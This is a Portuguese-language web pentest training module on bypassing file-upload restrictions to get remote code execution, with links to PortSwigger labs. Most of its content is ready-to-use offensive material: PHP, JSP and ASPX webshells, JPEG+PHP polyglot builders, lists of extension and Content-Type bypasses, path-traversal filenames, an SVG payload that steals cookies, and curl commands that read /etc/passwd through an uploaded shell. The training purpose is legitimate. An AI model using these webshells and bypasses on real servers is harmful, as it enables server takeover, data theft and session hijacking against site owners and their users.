# 📤 08. File Upload — Bypass de Restrições de Upload

> Upload de arquivo é a porta de entrada mais negligenciada. Uma extensão errada pode significar RCE direto no servidor.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `Burp Repeater, curl` |

</div>

---

## 🎓 Por que isso importa?

File upload vulnerabilities ocorrem quando uma aplicação permite upload de arquivos **sem validar adequadamente** o tipo, extensão, conteúdo ou destino. Se o servidor armazena e executa o arquivo, o atacante pode fazer upload de uma **webshell** e obter RCE.

**Analogia:** Imagine um porteiro que verifica se você tem convite, mas não verifica se a mala que entra contém algo perigoso. Ele vê que é uma "mala" e deixa passar — sem abrir.

**Impacto real:**
- **RCE** via webshell upload (PHP, JSP, ASPX)
- **XSS** via SVG upload (contém XML/JavaScript)
- **XXE** via SVG upload (external entities)
- **Path traversal** renomeando o arquivo
- **DoS** via upload de arquivos enormes
- **Defacement** via upload de HTML/ImageMagick exploit

**OWASP 2025:** Mapeado em **A01:2025 Broken Access Control** (CWE-434)

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (multipart/form-data) | Sim | Módulo 00 |
| Burp Suite (Proxy, Repeater) | Sim | Arquivo 01 deste módulo |
| O que é webshell | Sim | Este arquivo explica |

---

## 🎯 Quando testar File Upload

- Quando existe qualquer formulário de upload na aplicação
- Para testar upload de avatar, documento, planilha, imagem
- Quando a aceitação de arquivos depende de extensão ou Content-Type
- Quando o upload é feito via API (multipart/form-data ou binário)
- Para upload de SVG (possibilita XSS e XXE)

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐
│   Atacante   │ ──file─►│   App Web        │
│              │         │  (validação)     │
└──────────────┘         └──────────────────┘
                                │
                    ┌───────────┴───────────┐
                    │                       │
               Validação?              Sem validação?
                    │                       │
                    ▼                       ▼
            ┌──────────────┐        ┌──────────────┐
            │ Bloquear ou  │        │  Armazenar   │
            │ rejeitar     │        │  no servidor  │
            └──────────────┘        └──────────────┘
                                          │
                                          ▼
                                   ┌──────────────┐
                                   │  Acessar via │
                                   │  URL → RCE   │
                                   └──────────────┘
```

---

## 📋 Técnicas de Bypass de Upload

### 1. Bypass de Extensão (Blacklist)

| Extensão Original | Extensão para Bypass |
|-------------------|---------------------|
| `.php` | `.phtml`, `.pht`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar`, `.pgif` |
| `.jsp` | `.jspx`, `.jsw`, `.jsv`, `.jspf` |
| `.asp` | `.asa`, `.cer`, `.cdx` |
| `.aspx` | `.ascx`, `.ashx`, `.asmx` |
| `.html` | `.html5`, `.shtml`, `.stm` |
| `.svg` | `.svgz` (contém XML) |
| Qualquer | `.php.jpg` (double extension) |
| Qualquer | `.php%00.jpg` (null byte — PHP < 5.3.4) |
| Qualquer | `.PHP` (case variation) |
| Qualquer | `.php.`, `.php...` (trailing dots) |
| Qualquer | `.php.jpg` (Apache mod_negotiation) |

### 2. Bypass de Content-Type (Whitebox)

```bash
# Content-Type permitidos comuns:
image/jpeg
image/png
image/gif
image/svg+xml

# Bypass: mudar Content-Type no request
Content-Type: image/jpeg   ← aceito
Content-Type: application/x-php  ← bloqueado

# Via Burp Repeater: trocar Content-Type
Content-Type: image/jpeg
# mas manter extensão .php no filename
```

### 3. Bypass de Magic Bytes

```bash
# Adicionar magic bytes no início do arquivo
# JPEG: FF D8 FF E0
# PNG: 89 50 4E 47
# GIF: 47 49 46 38

# Criar webshell com magic bytes JPEG:
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

### 4. Bypass via Path Traversal

```bash
# Renomear para写入 diretório pai
filename=../../../var/www/html/shell.php
filename=....//....//....//var/www/html/shell.php
filename=..%2f..%2f..%2fvar/www/html/shell.php
```

### 5. Bypass via Double Extension

```bash
# Apache com mod_negotiation pode executar shell.php.jpg
# Se o Apache tiver: AddType application/x-httpd-php .php

filename=shell.php.jpg
filename=shell.php.png
filename=shell.php.html
filename=shell.php%00.jpg   (null byte — PHP antigo)
```

### 6. Polyglot File

```bash
# Arquivo que é válido como múltiplos tipos ao mesmo tempo
# Ex: arquivo que é JPEG E PHP

# Criar polyglot (imagem + PHP):
python3 -c "
import struct
# Magic bytes JPEG
jpeg = b'\xff\xd8\xff\xe0'
# PHP code
php = b'<?php system(\$_GET[\"cmd\"]); ?>'
# Magic bytes JPEG end
jpeg_end = b'\xff\xd9'
# Salvar
with open('polyglot.php.jpg', 'wb') as f:
    f.write(jpeg + php + jpeg_end)
print('Polyglot criado: polyglot.php.jpg')
"
```

---

## 📝 Exemplos Práticos

### Exemplo 1: Upload de Webshell Básico

```bash
# Criar webshell PHP simples
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload via Burp
# 1. Intercept → selecionar arquivo → upload
# 2. Enviar para Repeater
# 3. Modificar filename:
#    Content-Disposition: form-data; name="file"; filename="shell.php"
#    Content-Type: image/jpeg
# 4. Enviar

# Acessar webshell
curl "http://target.com/uploads/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Exploração
curl "http://target.com/uploads/shell.php?cmd=cat /etc/passwd"
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

### Exemplo 2: Bypass de Blacklist (Double Extension)

```bash
# Se .php é bloqueado, tentar .phtml
curl -X POST http://target.com/upload \
  -F "file=@shell.phtml;type=image/jpeg" \
  -F "submit=Upload"

# Ou .php.jpg (Apache mod_negotiation)
curl -X POST http://target.com/upload \
  -F "file=@shell.php.jpg;type=image/jpeg" \
  -F "submit=Upload"

# Acessar
curl "http://target.com/uploads/shell.phtml?cmd=id"
curl "http://target.com/uploads/shell.php.jpg?cmd=id"
```

### Exemplo 3: Bypass de Content-Type

```bash
# 1. Interceptar upload no Burp
# 2. Enviar para Repeater
# 3. Modificar Content-Type no form-data:

POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← TROCAR AQUI

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# 4. Enviar → upload aceito
```

### Exemplo 4: Bypass via Magic Bytes

```bash
# Criar arquivo com magic bytes + webshell
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Upload
curl -X POST http://target.com/upload \
  -F "file=@shell.php.jpg;type=image/jpeg"

# Acessar
curl "http://target.com/uploads/shell.php.jpg?cmd=id"
```

### Exemplo 5: SVG Upload com XSS

```bash
# Criar SVG com JavaScript
cat > xss.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="300" fill="white"/>
  <text font-size="20" x="10" y="50">XSS via SVG</text>
  <script type="text/javascript">alert(document.cookie)</script>
</svg>
EOF

# Upload
curl -X POST http://target.com/upload \
  -F "file=@xss.svg;type=image/svg+xml"

# Acessar → XSS dispara ao visualizar SVG
```

### Exemplo 6: Upload via Burp com Path Traversal

```bash
# 1. Interceptar upload
# 2. Enviar para Repeater
# 3. Modificar filename com path traversal:

Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"

# 4. Enviar → arquivo salvo fora do diretório de uploads
# 5. Acessar via URL normal
```

---

## 🔄 Fluxo de Teste File Upload

```
┌─────────────────────────────────────────────────────────┐
│  1. MAPEAR UPLOADS                                       │
│     - Encontrar todos os formulários de upload           │
│     - Identificar extensões permitidas                   │
│     - Verificar Content-Type validation                  │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. TESTAR EXTENSÕES PERMITIDAS                          │
│     - Upload de arquivo legítimo (imagem)                │
│     - Observar response e armazenamento                  │
│     - Identificar diretório de uploads                   │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TENTAR BYPASS                                        │
│     - Extensões alternativas (.phtml, .phar, .php3)     │
│     - Double extension (.php.jpg)                        │
│     - Content-Type bypass                                │
│     - Magic bytes bypass                                 │
│     - Null byte bypass                                   │
│     - Case variation (.PHP, .Php)                        │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. UPLOAD DE WEBSHELL                                   │
│     - PHP: <?php system($_GET['cmd']); ?>                │
│     - JSP: <% Runtime.getRuntime().exec(request...      │
│     - ASPX: <%Response.Write(Request("cmd"))%>          │
│     - Acessar via URL → confirmar execução              │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. AVANÇAR                                               │
│     - Path traversal no filename                         │
│     - Polyglot files                                     │
│     - SVG + XSS/XXE                                      │
│     - Race condition (upload + delete)                   │
│     - ImageMagick/ghostscript exploit                    │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Upload retorna 403" | Content-Type ou extensão bloqueada → testar variações |
| "Arquivo não executa" | Servidor não executa PHP nesse diretório → testar outros paths |
| "Não encontro o upload" | Fuzzar: /upload, /uploads, /api/upload, /api/v1/file |
| "Arquivo renomeado" | Observar nome final → pode ter hash ou timestamp |
| "SVG não dispara XSS" | Browser pode bloquear → testar com diferentes browsers |
| "PHP não funciona" | PHP desabilitado ou versión > 5.3.4 sem null byte |

---

## 📋 Cheat Sheet Rápido

### Webshells por Linguagem

```bash
# PHP
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ASPX
<%Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd", "/c "+Request["cmd"]){RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd());%>

# Python (Flask)
import os; os.system(os.environ.get('cmd','id'))
```

### Magic Bytes

```
JPEG: FF D8 FF E0
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38
PDF:  25 50 44 46
ZIP:  50 4B 03 04
```

### Extensões por Servidor

```
Apache:  .php, .phtml, .pht, .php3, .php4, .php5, .phar
Nginx:   .php (se fastcgi configurado)
IIS:     .asp, .aspx, .cer, .asa
Tomcat:  .jsp, .jspx
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution) | Webshell básico | 10min |
| 2 | PortSwigger | [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-content-type-restriction-bypass) | Content-Type bypass | 10min |
| 3 | PortSwigger | [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-path-traversal) | Path traversal | 15min |
| 4 | PortSwigger | [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-extension-blacklist-bypass) | Extension blacklist | 15min |
| 5 | PortSwigger | [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-obfuscated-file-extension) | Extension obfuscation | 15min |
| 6 | PortSwigger | [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-polyglot-web-shell) | Polyglot files | 20min |
| 7 | PortSwigger | [Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-race-condition) | Race condition | 25min |

---

## 📚 Referências

- [PortSwigger — File Upload](https://portswigger.net/web-security/file-upload)
- [PortSwigger — File Upload Labs](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload-vulnerabilities)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [GTFOBins — bypassar restrições](https://gtfobins.github.io/)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar formulários de upload em uma aplicação
- [ ] Criar webshells para PHP, JSP e ASPX
- [ ] Bypassar blacklists de extensão (double extension, null byte, case)
- [ ] Bypassar validação de Content-Type
- [ ] Bypassar validação de magic bytes
- [ ] Usar path traversal no filename
- [ ] Criar polyglot files (imagem + código executável)
- [ ] Upload de SVG com XSS e XXE
- [ ] Encontrar o diretório de uploads e acessar webshell
- [ ] Completar todos os labs PortSwigger de File Upload
